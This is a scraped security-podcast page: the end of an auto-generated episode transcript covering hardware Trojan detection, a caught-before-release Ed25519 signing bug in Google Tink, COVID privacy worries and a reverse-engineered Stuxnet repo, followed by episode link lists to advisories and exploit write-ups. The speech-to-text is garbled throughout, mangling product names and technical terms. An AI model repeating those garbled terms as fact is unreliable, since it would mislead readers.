the circuit and then they use also over overclocking to kind of result in some higher delays when doing that and then it's the difference that they're finding like the difference in those bit flips the difference in the errors that happen when there's a region versus when there's not a\", \"start\": 4375.5}, {\"speaker\": 1, \"line\": \" Trojan checking for side effects\", \"start\": 4402.2}, {\"speaker\": 2, \"line\": \" based. Yeah, and I thought this is the interest paper not because I totally understood everything here. But because this is an issue that I've known really thought about obviously it exists it matters. It's not in an area that I deal with like I don't deal with hardware at all. John are you I'm really knowledgeable in and but it is an area that like it matters. It's not something I've thought about but it was still kind of interesting like, you know, this is what they're doing. And this is what they're thinking about in terms of trying to detect those Hardware implants those Trojans.\", \"start\": 4404.6}, {\"speaker\": 1, \"line\": \" Yeah. I'm getting into some results when they tested their setup. They ended up testing against some Trojan circuits from trust Hub. So they provide like Trojan circuits for testing for Or like these kinds of projects and they tested against three circuits the basic RS 80 100 a AST 100 and the AST 1000 and when they tested they ended up finding that they had a 99% detection rate against those circuits. So it seems to be like really promising and how accurate it is. That being said they did only test against those three benchmarking circuits. So it is pretty limited. It would be cool to see it. It's results against other circuits, though. That's pretty difficult like getting your hands on like known Trojan circuits is probably not too easy to do so, I don't blame them for that. But you know just know that that test results that is a little bit limited. So you might want to take that 99 percent figure with a you know, grain of salt.\", \"start\": 4437.5}, {\"speaker\": 2, \"line\": \" It's a long. Otherwise that was that 99% is a very good\", \"start\": 4495.4}, {\"speaker\": 1, \"line\": \" result. Oh, yeah sure. It's a long paper. It goes pretty low-level. Like obviously you're dealing with Hardware stuff. But Hardware stuff is always fun to talk about because it's almost like dark magic in a way. A lot of people don't really understand the some of the implications that can happen at that level and using stuff like voltage and current and overclocking and stuff like that to detect these errors and bit flips. Like it's such a low level that like 99% of people do not think about and that's what kind of makes it cool. You know, what it highlights the fact that with Hardware even the most benign things can hold valuable information, which is why it's such an interesting research area. So, you know, definitely One of the bring that up. It's a cool. It's a very fun paper, but it is like it's not incredibly accessible. You can get that higher level view like we did but unless you're like familiar with hardware and the math and some of the you know science at that lower level. You might struggle getting some of the more intricate details of it. Just you know, just as a fair warning I guess. Did you have any final thoughts on that paper though?\", \"start\": 4498.8}, {\"speaker\": 2, \"line\": \" See? No, I mean I didn't even try to get the deeper understanding of it to be honest for all my took this as you know, it's interesting area. I haven't seen much on this got the high level understanding of what's going on, but I didn't even try to dig too deep into it.\", \"start\": 4564.5}, {\"speaker\": 1, \"line\": \" Yeah, so we'll move on to our final topic and it's aptly named a final security bug. Oh you're bringing up duct tape though.\", \"start\": 4580.6}, {\"speaker\": 2, \"line\": \" I've brought that up. Because you accidentally brought this paper up when you switch topics. Don't worry about it.\", \"start\": 4591.0}, {\"speaker\": 1, \"line\": \" Oh fair enough. So it describes a gang Google tanks Ed to five five one nine Java implementation,\", \"start\": 4597.0}, {\"speaker\": 2, \"line\": \" which is all those three really private Keys really important to mention that this did not make it into the release version of tank, which is their kind of easy to use crypto Library significant bug did not make it into an actual thing. So like no empath It was actually found like in 2017 and patch in 2017. Yeah, I just this is the first time it's being written up. I believe he's presenting about this actually at some conference is that Thomas come up on my I-Car feed the cryptography feed. So I think there's some crypto conference at this will be presented at\", \"start\": 4604.9}, {\"speaker\": 1, \"line\": \" if the conference happens, you know, it's very close good to see it canceled. Maybe yeah, but they describe they first described add to five five one nine, which I haven't really heard of but it's basically an Edwards curve digital signature algorithm which uses sha-256 and curve to five five one nine. That's where those stitches come from there. They praised it quite a bit. They say it was designed with excellent security engineer because iteration so\", \"start\": 4645.4}, {\"speaker\": 2, \"line\": \" well, so the guy writing this from Google ting Google tank is from Google. I feel like there might be some bias here that said I can't I can't really say that they're not yeah that said like I Googled definitely hires good. People so I'm gonna assume it's true. Like I I'm going to kind of pointing that out ingest the more than out of a sort of serious issue with anybody\", \"start\": 4672.4}, {\"speaker\": 1, \"line\": \" involved. Yeah, so she was not a bug that's like, you know a design flaw in the algorithm. It's actually in the implementation and the issue is when they sign the message they pass the message the public key and the hash private key and these arguments should not be changed by the collie function. And this is signaled by using the final keyword. The problem is these parameters are raised and the contents of these Rays can be changed without raising errors, even though it's declared as final because they kind of misunderstood how final worked\", \"start\": 4696.9}, {\"speaker\": 2, \"line\": \" well so it's more I actually even want to put the blame or towards Java on this one. So if you're a c programmer, you're familiar const Char star constant a character array pointer, but when you use that The array itself the contents of it you can't modify it that's the idea of using the constant. A Java doesn't have an equivalent to that Java has this final which if you're not intimately familiar with the Java you my you'd be forgiven for thinking it's you know, the same thing is constant, but it's not that Specter saying it ends up protecting it basically saying like you can only assign a value to this variable or this field wants So it assigns the pointer value basically for the array doesn't act protect the content of it just kind of that initial pointer assignment for and that's kind of how Java does it? So as he's mentioning in Malad which just does like a basic competent or like a modular arithmetic on it? that ends up it passes in the hash private key twice to that function which ends up modifying the message and all I hear you kind of get back to what you were saying\", \"start\": 4730.8}, {\"speaker\": 1, \"line\": \" yeah the issue is because the collie can modify the parameter and it ends up modifying the hash private key and the first 32 bytes of that key is published and that means if you get two messages signed with the same key you can compute the private key see by using an equation to eliminate the modifications that were done to the hatch private key so they have a I think page for they have some those equations that you could use obviously I'm not a I'm not a crypto person I'm not a math major so I don't fully understand these equations but the fact is you know you can end up calculating the differences it's cool paper it is a little bit it's pretty mathy like some of the previous papers we've\", \"start\": 4810.8}, {\"speaker\": 2, \"line\": \" covered it is I mean the key thing though is just that Final aspect like the fact that the values are getting modified ends up reusing this modified value. So the first time through a calculates signature correctly the second time through that hash private key is actually saved its kind of cash and that's where that second time through because it got modified it ends up using a different value and then you kind of figure things out from there. So it does go into the math but really the key thing there that I thought was interest was just the fact the issue was this trust in final which is where I kind of I'm down on Jabba for not having something equal to the constant in like C++ and c.\", \"start\": 4854.3}, {\"speaker\": 1, \"line\": \" I think I'd agree with that. Yeah, I'd agree with that. It's cool. Right like it just shows like even if you're like a super smart person who's like really good with crypto with when you're getting into the implementation level. Even if it's done by experts in the field. It's still very easy to make very subtle mistakes and you know that ends up getting an attacker is We an oracle into your crypto. Yes. Yes, not something you ever want them to\", \"start\": 4895.1}, {\"speaker\": 2, \"line\": \" have something that was mentioned here was even doing the standard test but using like all the standard test cases wouldn't have discovered this and didn't discover this because the standard test would just check like case the signature just running it once this is a signature result correctly. Yep, and it would in the first time it would work. So the implementation was\", \"start\": 4921.3}, {\"speaker\": 1, \"line\": \" okay. Yeah, kind of lends Credence to that fact that especially when you're talking about crypto and a library that is from somebody like Google that a lot of people are going to use. You're probably going to want to write your unit tests more like you want to test with a lot more edge cases and try to be more aggressive and testing I guess on that because if they were they might have caught this issue, you know what I\", \"start\": 4943.1}, {\"speaker\": 2, \"line\": \" mean? Well, they did catch this s key issue\", \"start\": 4966.8}, {\"speaker\": 1, \"line\": \" because they might have caught it earlier I\", \"start\": 4969.0}, {\"speaker\": 2, \"line\": \" guess is yeah I know but to be fair like this was again. Repeat this was caught pre-release. This was an audit being done before they release that so it was caught but yeah, like what it could have been caught in during development, you know doing more being more tests at that point and I would imagine they immediately added in a regression tests to cover this. Anyhow,\", \"start\": 4971.4}, {\"speaker\": 1, \"line\": \" yeah, so, you know, this is a really cool insight into you know crypto stuff which again like Hardware is kind of like a dark magic area, so Definitely a fun read I want to bring up from chat. Sorry for the off-topic. How are you? All doing during the quarantine? I don't know. How you doing\", \"start\": 4993.9}, {\"speaker\": 2, \"line\": \" Tim that and I kind of already letter L know where I don't know how to quite say like, yeah, and I'm very much in the middle of nowhere. I think there was as far as I know like the closest case is to me there might be one in town. There were three like a half hour from me and otherwise like most of the outbreaks been two hours or three hours away from me and kind of like the big cities near here. We're already down to the point where we have more people recovered than current or then Active cases. So quarantines been pretty fun for me.\", \"start\": 5011.9}, {\"speaker\": 1, \"line\": \" You've been pressing for years even self isolated rural.\", \"start\": 5045.7}, {\"speaker\": 2, \"line\": \" Yeah. Well the hiking there just I'm used to being on my own.\", \"start\": 5049.7}, {\"speaker\": 1, \"line\": \" Yeah. I mean in my case, I'm in a town that is a little bit more populated. It's not like I don't live in like Toronto or something, so it's not crazy. But it has kind of sucked just not being able to you know, go out anywhere. I like to go out for walks and stuff like that. You know, I've been I have been doing some of that but I don't go as far and I don't go anywhere, you know, I have to walk around people and you know, you know practice the social distancing. It's very weird and it does kind of suck not being able to go out and do stuff especially where it's getting warmer. Now this ground isn't covered in snow at the same time though a lot. The stuff I do is you know online. So I guess I'm kind of Lucky in that regard. It's not like, you know, I go shopping and stuff a ton. So I thought I don't think it doesn't look like our new shoes. I don't go casual shopping every two weeks\", \"start\": 5054.3}, {\"speaker\": 2, \"line\": \" or as you mentioned word log down until April 30th digital passes to go outside for hour at a time at digital passes. It sounds like some high-tech country doing that.\", \"start\": 5109.5}, {\"speaker\": 1, \"line\": \" I've heard of that and I have some I am not happy with some of the direction. You know, I'm less worried about the quarantine and self-isolation aspects from this as much as I'm worried about the technical advancements that are being made that are very privacy invasive which I think we will end up talking about and do a video on a little bit later, but I'm very concerned about the Privacy implications and some of the stuff that's because he\", \"start\": 5122.5}, {\"speaker\": 2, \"line\": \" has this is something that governments can definitely Jump back to push through laws that maybe wouldn't get big push through other ones similar to kind of 9/11 in the US. Yep. I kind of gained things through there. I could definitely see that going on. I mean the Canadian government tried to pass some fairly. Unrestricted payment or not payment. I can't think of the right words to use here which\", \"start\": 5148.8}, {\"speaker\": 1, \"line\": \" being able to use funding without like\", \"start\": 5179.1}, {\"speaker\": 2, \"line\": \" approval. Yeah without needing much oversight on it for quite a\", \"start\": 5180.9}, {\"speaker\": 1, \"line\": \" while. Yeah, I mean, it's just I'll go into more detail on the video we do about it, but overall like my problem is a lot of this technology that's coming out of you know, trying to Two people this technology is not going to be put back in the Box, you know history shown us that you know,\", \"start\": 5185.2}, {\"speaker\": 2, \"line\": \" no, I mean once it's out itself because you're talking about contact tracing. Yeah.\", \"start\": 5204.8}, {\"speaker\": 1, \"line\": \" That's the main one. Yeah. So, you know, we'll do a video on that do some videos on that. But you know, and that is a little bit concerning for me. That's probably the most concerning aspect of the covid stuff for me\", \"start\": 5209.8}, {\"speaker\": 2, \"line\": \" fair enough.\", \"start\": 5221.1}, {\"speaker\": 1, \"line\": \" That means that we'll move into some shoutouts. I do have one like last-minute shout. I Added and that's open murders. They kind of this Arc e-version. I think they mean AA read version but it's basically somebody ended up reversing stuxnet and basically rewriting it into source code. So, you know stuxnet is like probably the biggest, you know were more Trojan that's ever been, you know talked about and history. It's very interesting and it's a very complex malware and you know reversing it took like, you know, V guys and stuff months to do so the fact that it's been reversed and Rewritten. I think that could be very cool to look at for people obviously sucks that you allows from like 2008. It's pretty old now, but you know, it still might be like interesting for people who want to look into how that stuff works. It doesn't seem like the repository has a license. They say both of our licenses are extremely permissive. You can do anything you want with the code provided. We just ask that you give us credit. Basically,\", \"start\": 5222.8}, {\"speaker\": 2, \"line\": \" there's three license file. I'll but the files themselves. Like I just pulled off one of the C files here has license in\", \"start\": 5286.7}, {\"speaker\": 1, \"line\": \" it. Oh, yeah, it's under gnu GPL. Okay. Yeah fair enough. So yeah, the the repo doesn't have one but the files to okay, but yeah, they're under the GPL license. So, you know, I think you know, obviously I don't think you should use this because I don't know why you would use this at side of a malicious context, but I think it could be a really interesting study for people who are interested in malware and stuff like that. I\", \"start\": 5293.1}, {\"speaker\": 2, \"line\": \" mean personally, I just like to run rootkits. I mean, it's just it's a hobby\", \"start\": 5315.0}, {\"speaker\": 1, \"line\": \" just for just for fun. Yeah, it's\", \"start\": 5319.6}, {\"speaker\": 2, \"line\": \" like the there's an XKCD. I\", \"start\": 5321.5}, {\"speaker\": 1, \"line\": \" know there's always next are days every scenario. I\", \"start\": 5331.3}, {\"speaker\": 2, \"line\": \" think they're they're tracking their virtual Windows machines Network together hooked off to track have all the viruses coming through\", \"start\": 5333.7}], \"speakers\": {\"1\": \"Specter\", \"2\": \"zi\"}, \"offset\": \"8\", \"youtube\": \"BOntbAGzYtU\"}\nTRANSCRIPT--><!--kg-card-end: html-->","slug":"episode-37"}},{"node":{"title":"Episode 23 - First Edge bounty, Hacking Tesla, Cisco advisories, and Shadow Clones","path":"/posts/episode-23/","date":"7 January 2020","description":"First episode of the decade! First, CCC then some Kali news and all the technical details we can find behind several issues impacting the new Edge browser, Teslas, Cisco DC Network Manager, and others. Ending off with a discussion about a Data-Oriented Programming attack mitigation: Shadow clones.","content":"<!--kg-card-begin: html--><iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/ROLZDoQ9MEY\" frameborder=\"0\" allow=\"accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe><!--kg-card-end: html--><hr><!--kg-card-begin: html--><ul>\n<li>[00:00:40] <a href='https://events.ccc.de/congress/2019/wiki/index.php/Main_Page'>CCC</a></li><br />\n<li>[00:14:58] <a href='https://www.python.org/doc/sunset-python-2/'>Sunsetting Python 2 | Python.org</a></li><br />\n<ul><li><a href='https://www.python.org/blogs/'>https://www.python.org/blogs/</a></li></ul><br />\n<li>[00:19:11] <a href='https://twitter.com/kalilinux/status/1212055963462705152'>Kali 2020.1 -  Default Non-Root User</a></li><br />\n<ul><li><a href='https://www.kali.org/news/kali-default-non-root-user/'>https://www.kali.org/news/kali-default-non-root-user/</a></li></ul><br />\n<ul><li><a href='https://www.offensive-security.com/'>https://www.offensive-security.com/</a></li></ul><br />\n<li>[00:35:53] <a href='https://www.youtube.com/watch?v=n1m9W_KppZY'>Caterpillar padlocks all use the same key</a></li><br />\n<li>[00:42:51] <a href='https://decrypt.co/15730/shitcoin-wallet-is-a-scam-says-security-researcher'>Shitcoin Wallet is a scam, says security researcher</a></li><br />\n<li>[00:47:13] <a href='https://leucosite.com/Edge-Chromium-EoP-RCE/'>Microsoft Edge (Chromium) - Elevation of Privilege to Potential Remote Code Execution</a></li><br />\n<li>[00:56:57] <a href='https://keenlab.tencent.com/en/2020/01/02/exploiting-wifi-stack-on-tesla-model-s/'>Exploiting Wi-Fi Stack on Tesla Model S | Keen Security Lab Blog</a></li><br />\n<li>[01:08:52] <a href='https://krystalgamer.github.io/spidey-buffer-overflow/'>Spiderman 2000 - Buffer overflow in file loading routine</a></li><br />\n<li>[01:14:31] <a href='https://jyx.github.io/alert-alarm-exploit.html'>Alert Alarm SMS exploit</a></li><br />\n<li>[01:27:33] <a href='https://medium.com/@s1kr10s/d-link-dir-859-rce-unautenticated-cve-2019-17621-en-d94b47a15104'>D-Link DIR-859 - Unauthenticated RCE (CVE-2019-17621)</a></li><br />\n<li>[01:33:20] <a href='https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20200102-dcnm-auth-bypass'>Cisco Security Advisory: Cisco Data Center Network Manager Authentication Bypass Vulnerabilities</a></li><br />\n<ul><li><a href='https://tools.cisco.com/security/center/publicationListing.x'>https://tools.cisco.com/security/center/publicationListing.x</a></li></ul><br />\n<ul><li><a href='https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20200102-dcnm-path-trav'>https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20200102-dcnm-path-trav</a></li></ul><br />\n<li>[01:45:03] <a href='https://hackerone.com/reports/716292'>Starbuck's JumpCloud API Key leaked via Open Github Repository</a></li><br />\n<ul><li><a href='https://www.androidpolice.com/2020/01/06/uh-oh-xiaomi-camera-feed-showing-random-homes-on-a-google-nest-hub-including-still-images-of-sleeping-people/'>https://www.androidpolice.com/2020/01/06/uh-oh-xiaomi-camera-feed-showing-random-homes-on-a-google-nest-hub-including-still-images-of-sleeping-people/</a></li></ul><br />\n<li>[01:56:39] <a href='https://arxiv.org/abs/1912.11523v2'>JackHammer: Efficient Rowhammer on Heterogeneous FPGA-CPU Platforms</a></li><br />\n<li>[02:02:28] <a href='https://web.eecs.umich.edu/~chshibo/project/shadowclone/'>Shadowclone: Thwarting and Detecting DOP Attacks with Stack Layout Randomization and Canary</a></li><br />\n<li>[02:15:21] <a href='https://www.ambionics.io/blog/php-mt-rand-prediction'>Breaking PHP's mt_rand() with 2 values and no bruteforce</a></li><br /></ul><!--kg-card-end: html-->","slug":"episode-23"}},{"node":{"title":"Episode 22 - PlunderVolt, Real-World Bug Hunting, Presidents Cup CTF, SockPuppet and more","path":"/posts/episode-22/","date":"17 December 2019","description":"Starting off the episode is a quick review of Real-World Bug Hunting before moving into this week's news and the Plundervolt vulnerability.","content":"<!--kg-card-begin: html--><iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/zb7Gda1gdjQ\" frameborder=\"0\" allow=\"accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe><!--kg-card-end: html--><hr><!--kg-card-begin: html--><p>You can watch the DAY[0] podcast live on <a href=\"https://www.twitch.tv/dayzerosec\">Twitch (@dayzerosec)</a> every Monday afternoon at 12:00pm PST (3:00pm EST)</p>\n<p>Our past episodes are available on the following platforms</p>\n<ul>\n    <li><a href=\"https://youtube.com/c/dayzerosec\">Youtube (@DAY[0])</a></li>\n    <li><a href=\"https://open.spotify.com/show/4NKCxk8aPEuEFuHsEQ9Tdt\">Spotify</a></li>\n    <li><a href=\"https://podcasts.apple.com/us/podcast/day-0-zero-days-for-day-zero/id1484046063?uo=4\">Apple Podcasts</a></li>\n    <li><a href=\"https://www.google.com/podcasts?feed=aHR0cHM6Ly9hbmNob3IuZm0vcy9hMTIxYTI0L3BvZGNhc3QvcnNz\">Google Podcasts</a></li>\n    <li>For a full list of platforms visit <a href=\"https://anchor.fm/dayzerosec\">Anchor</a></li>\n</ul><!--kg-card-end: html--><!--kg-card-begin: html--><ul>\n<li>[00:01:18] <a href='/'>Last Episode of the Year</a></li><br />\n<li>[00:01:36] <a href='https://www.amazon.com/dp/1593278616'>Real-World Bug Hunting: A Field Guide to Web Hacking</a></li><br />\n<ul><li><a href='http://www.phrack.org/papers/attacking_javascript_engines.html'>http://www.phrack.org/papers/attacking_javascript_engines.html</a></li></ul><br />\n<li>[00:11:29] <a href='https://www.cisa.gov/presidentscup'>President's Cup</a></li><br />\n<li>[00:24:20] <a href='https://www.blog.google/products/chrome/better-password-protections/'>Better Password Protections [in Chrome]</a></li><br />\n<li>[00:30:18] <a href='https://twitter.com/sbingner/status/1204499997909110785'>Apple DMCA's SEP Key</a></li><br />\n<ul><li><a href='https://en.wikipedia.org/wiki/Illegal_number'>https://en.wikipedia.org/wiki/Illegal_number</a></li></ul><br />\n<li>[00:36:59] <a href='https://arxiv.org/abs/1912.05183v1'>Rosita: Towards Automatic Elimination of Power-Analysis Leakage in Ciphers</a></li><br />\n<li>[00:48:50] <a href='https://arxiv.org/abs/1912.04145v1'>Camouflage: Hardware-assisted CFI for the ARM Linux kernel</a></li><br />\n<li>[01:00:37] <a href='https://blog.npmjs.org/post/189618601100/binary-planting-with-the-npm-cli'>Binary Planting with the npm CLI</a></li><br />\n<li>[01:04:55] <a href='https://plundervolt.com/doc/plundervolt.pdf'>Plundervolt </a></li><br />\n<li>[01:17:35] <a href='https://www.openwall.com/lists/oss-security/2019/12/11/9'>Local Privilege Escalation in OpenBSD's dynamic loader (CVE-2019-19726)</a></li><br />\n<li>[01:24:09] <a href='https://kishanbagaria.com/airdos/'>AirDoS: Remotely render any nearby iPhone or iPad unusable</a></li><br />\n<li>[01:26:24] <a href='https://labs.f-secure.com/blog/digital-lockpicking-stealing-keys-to-the-kingdom/'>Digital Lockpicking - Stealing Keys to the Kingdom (KeyWe Smart Lock)</a></li><br />\n<ul><li><a href='https://labs.f-secure.com/advisories/keywe-smart-lock-unauthorized-access-traffic-interception'>https://labs.f-secure.com/advisories/keywe-smart-lock-unauthorized-access-traffic-interception</a></li></ul><br />\n<li>[01:31:44] <a href='https://googleprojectzero.blogspot.com/2019/12/sockpuppet-walkthrough-of-kernel.html'>SockPuppet: A Walkthrough of a Kernel Exploit for iOS 12.4</a></li><br />\n<li>[01:39:05] <a href='https://vimeo.com/377181218'>Maddie Stone: Whatsup with WhatsApp: A Detailed Walk Through of Reverse Engineering CVE-2019-3568</a></li><br />\n<li>[01:46:37] <a href='https://arxiv.org/abs/1912.04669v1'>Client-side Vulnerabilities in Commercial VPNs</a></li><br />\n<li>[01:54:50] <a href='https://newsroom.nccgroup.com/blog_posts/a-technical-review-of-connected-toy-security-88677'>A Technical Review of Connected Toy Security</a></li><br />\n<ul><li><a href='https://www.which.co.uk/news/2019/12/kids-karaoke-machines-and-smart-toys-from-mattel-and-vtech-among-those-found-to-have-security-flaws-in-a-which-investigation/'>https://www.which.co.uk/news/2019/12/kids-karaoke-machines-and-smart-toys-from-mattel-and-vtech-among-those-found-to-have-security-flaws-in-a-which-investigation/</a></li></ul><br />\n<li>[02:07:43] <a href='https://nagarrosecurity.com/blog/interactive-buffer-overflow-exploitation'>Interactive Buffer Overflow Exploitation</a></li><br />\n<ul><li><a href='https://github.com/bordplate/js86'>https://github.com/bordplate/js86</a></li></ul><br />\n<ul><li><a href='https://nagarrosecurity.com/blog/interactive-rop-tutorial'>https://nagarrosecurity.com/blog/interactive-rop-tutorial</a></li></ul><br />\n</ul><!--kg-card-end: html-->","slug":"episode-22"}},{"node":{"title":"Episode 21 - Permanent DoS, HackerOne Hacked, and Wide-OpenBSD","path":"/posts/episode-20/","date":"10 December 2019","description":"Permanent Android DoS vulnerability, snooping on VPN traffic, value of anti-viruses, contact-less payment vulnerabilities, and more in this episode of DAY[0]","content":"<!--kg-card-begin: html--><iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/ksH9ZvrKBhg\" frameborder=\"0\" allow=\"accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n<!--kg-card-end: html--><hr><!--kg-card-begin: html--><p>You can watch the DAY[0] podcast live on <a href=\"https://www.twitch.tv/dayzerosec\">Twitch (@dayzerosec)</a> every Monday afternoon at 12:00pm PST (3:00pm EST)</p>\n<p>Our past episodes are available on the following platforms</p>\n<ul>\n    <li><a href=\"https://youtube.com/c/dayzerosec\">Youtube (@DAY[0])</a></li>\n    <li><a href=\"https://open.spotify.com/show/4NKCxk8aPEuEFuHsEQ9Tdt\">Spotify</a></li>\n    <li><a href=\"https://podcasts.apple.com/us/podcast/day-0-zero-days-for-day-zero/id1484046063?uo=4\">Apple Podcasts</a></li>\n    <li><a href=\"https://www.google.com/podcasts?feed=aHR0cHM6Ly9hbmNob3IuZm0vcy9hMTIxYTI0L3BvZGNhc3QvcnNz\">Google Podcasts</a></li>\n    <li>For a full list of platforms visit <a href=\"https://anchor.fm/dayzerosec\">Anchor</a></li>\n</ul><!--kg-card-end: html--><!--kg-card-begin: html--><ul>\n<li>[00:02:59] <a href='https://nvd.nist.gov/vuln/detail/CVE-2019-2232'>Android Permanent DoS (CVE-2019-2232)</a></li><br />\n<li>[00:08:09] <a href='https://seclists.org/oss-sec/2019/q4/122'>Inferring and hijacking VPN-tunneled TCP connections (CVE-2019-14899)</a></li><br />\n<li>[00:16:00] <a href='https://security.googleblog.com/2019/12/an-update-on-android-tls-adoption.html'>An Update on Android TLS Adoption</a></li><br />\n<li>[00:25:11] <a href='https://palant.de/2019/12/03/mozilla-removes-avast-extensions-from-their-add-on-store-what-will-google-do/'>Mozilla and Opera remove Avast extensions from their add-on stores</a></li><br />\n<ul><li><a href='https://palant.de/2019/10/28/avast-online-security-and-avast-secure-browser-are-spying-on-you/'>https://palant.de/2019/10/28/avast-online-security-and-avast-secure-browser-are-spying-on-you/</a></li></ul><br />\n<li>[00:43:05] <a href='https://community.pcgamingwiki.com/topic/4476-tron-evolution-securom-drm-expiration-makes-game-unplayable-9-years-after-release'>Tron: Evolution SecuROM DRM expiration makes game unplayable 9 years after release</a></li><br />\n<li>[00:50:12] <a href='https://www.vpnmentor.com/blog/report-truedialog-leak/?=truedialog-exposed-data'>Millions of Americans at Risk After Huge Data and SMS Leak</a></li><br />\n<li>[00:54:14] <a href='https://threatpost.com/nebraska-medicine-breached-rogue-employee/150823/'>Nebraska Medicine Breached by Rogue Employee</a></li><br />\n<li>[00:56:56] <a href='https://twitter.com/ppentestlabs/status/1202906268991664128'>Practical Pentest Labs stores passwords in plaintext</a></li><br />\n<li>[01:05:07] <a href='https://hackerone.com/reports/745324'>Incident Report | 2019-11-24 Account Takeover via Disclosed Session Cookie</a></li><br />\n<li>[01:13:28] <a href='https://www.openwall.com/lists/oss-security/2019/12/04/5'>Authentication vulnerabilities in OpenBSD (CVE-2019-19521)</a></li><br />\n<li>[01:24:36] <a href='https://labs.nettitude.com/blog/cve-2019-12750-symantec-endpoint-protection-local-privilege-escalation-part-1/'>Symantec Endpoint Protection Local Privilege Escalation (CVE-2019-12750)</a></li><br />\n<li>[01:30:09] <a href='https://ics.i3xplore.com/2019/12/06/omron-plc-denial-of-service-as-a-feature/'>Omron PLC Denial-of-Service as a Feature</a></li><br />\n<ul><li><a href='https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H'>https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</a></li></ul><br />\n<ul><li><a href='https://github.com/Ox6e3062306479/omron/blob/master/cj2m.fins.dos.py'>https://github.com/Ox6e3062306479/omron/blob/master/cj2m.fins.dos.py</a></li></ul><br />\n<li>[01:38:35] <a href='https://drive.google.com/file/d/1CaRz41bEwWsDZ9bPgdcatcesloxTF6Kv/view?usp=sharing'>FIRST CONTACT: New vulnerabilities in contactless payments </a></li><br />\n<li>[01:46:39] <a href='https://zznop.com/2019/12/08/fuzzing-sega-genesis-emulators/'>Fuzzing Sega Genesis Emulators</a></li><br />\n<li>[01:50:30] <a href='https://rcoh.me/posts/verifiable-voting-primer/'>Verifiable Voting Primer</a></li><br />\n<ul><li><a href='https://www.youtube.com/watch?v=LkH2r-sNjQs'>https://www.youtube.com/watch?v=LkH2r-sNjQs</a></li></ul><br /></ul><!--kg-card-end: html-->","slug":"episode-20"}},{"node":{"title":"Episode 20 - CWE Top 25, Hacking Anti-Viruses and Adversarial Machine Learning Attacks","path":"/posts/episode-20-cwe-top-25-hacking-anti-viruses-and-adversarial-machine-learning-attacks/","date":"3 December 2019","description":"In this episode we discuss some recent news regarding encryption laws, and the DHS updating the CWE Top 25 list. Then move into a handful of exploits before ending with some discussions about defending and attacking machine learning systems.","content":"<!--kg-card-begin: html--><iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/PMuCpqcKoWo\" frameborder=\"0\" allow=\"accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe><!--kg-card-end: html--><hr><!--kg-card-begin: html--><p>You can watch the DAY[0] podcast live on <a href=\"https://www.twitch.tv/dayzerosec\">Twitch (@dayzerosec)</a> every Monday afternoon at 12:00pm PST (3:00pm EST)</p>\n<p>Our past episodes are available on the following platforms</p>\n<ul>\n    <li><a href=\"https://youtube.com/c/dayzerosec\">Youtube (@DAY[0])</a></li>\n    <li><a href=\"https://open.spotify.com/show/4NKCxk8aPEuEFuHsEQ9Tdt\">Spotify</a></li>\n    <li><a href=\"https://podcasts.apple.com/us/podcast/day-0-zero-days-for-day-zero/id1484046063?uo=4\">Apple Podcasts</a></li>\n    <li><a href=\"https://www.google.com/podcasts?feed=aHR0cHM6Ly9hbmNob3IuZm0vcy9hMTIxYTI0L3BvZGNhc3QvcnNz\">Google Podcasts</a></li>\n    <li>For a full list of platforms visit <a href=\"https://anchor.fm/dayzerosec\">Anchor</a></li>\n</ul><!--kg-card-end: html--><!--kg-card-begin: html--><ul>\n<li>[00:02:08] <a href='https://blog.google/technology/safety-security/threat-analysis-group/protecting-users-government-backed-hacking-and-disinformation/'>Protecting users from government-backed hacking and disinformation</a></li><br />\n<li>[00:10:23] <a href='https://www.enisa.europa.eu/publications/enisa-threat-landscape-for-5g-networks'>ENISA threat landscape for 5G Networks </a></li><br />\n<li>[00:16:13] <a href='https://nakedsecurity.sophos.com/2019/11/27/eu-raises-eyebrows-at-possible-us-encryption-ban/'>EU raises eyebrows at possible US encryption ban</a></li><br />\n<li>[00:24:16] <a href='https://www.washingtonpost.com/technology/2019/09/18/you-watch-tv-your-tv-watches-back/'>You watch TV. Your TV watches back.</a></li><br />\n<li>[00:34:44] <a href='https://cwe.mitre.org/top25/archive/2019/2019_cwe_top25.html'>CWE - Top 25</a></li><br />\n<ul><li><a href='https://cwe.mitre.org/top25/archive/2011/2011_cwe_sans_top25.html'>https://cwe.mitre.org/top25/archive/2011/2011_cwe_sans_top25.html</a></li></ul><br />\n<li>[00:46:58] <a href='https://0x00sec.org/t/anti-virus-exploitation-local-privilege-escalation-in-k7-security-cve-2019-16897/17655'>LPE in K7 Security Anti-Virus (CVE-2019-16897)</a></li><br />\n<li>[00:47:09] <a href='https://sec-consult.com/en/blog/advisories/weak-encryption-cipher-and-hardcoded-cryptographic-keys-in-fortinet-products/'>Weak Crypto in Forinet Products</a></li><br />\n<li>[01:01:37] <a href='https://seclists.org/fulldisclosure/2019/Nov/27'>CVE-2019-11932 (double free in libpl_droidsonroids_gif) many apps vulnerable</a></li><br />\n<ul><li><a href='https://gist.github.com/wdormann/874198c1bd29c7dd2157d9fc1d858263'>https://gist.github.com/wdormann/874198c1bd29c7dd2157d9fc1d858263</a></li></ul><br />\n<li>[01:04:32] <a href='https://seclists.org/fulldisclosure/2019/Nov/33'>Max Secure Anti Virus Plus - 19.0.4.020 / CVE-2019-19382 Insecure Permissions</a></li><br />\n<li>[01:10:41] <a href='https://ssd-disclosure.com/archives/4047/ssd-advisory-synology-dsm-remote-command-injection'>Synology DSM Remote Command Injection</a></li><br />\n<li>[01:16:45] <a href='https://arxiv.org/abs/1911.12069v1'>SpoC: Spoofing Camera Fingerprints</a></li><br />\n<li>[01:24:44] <a 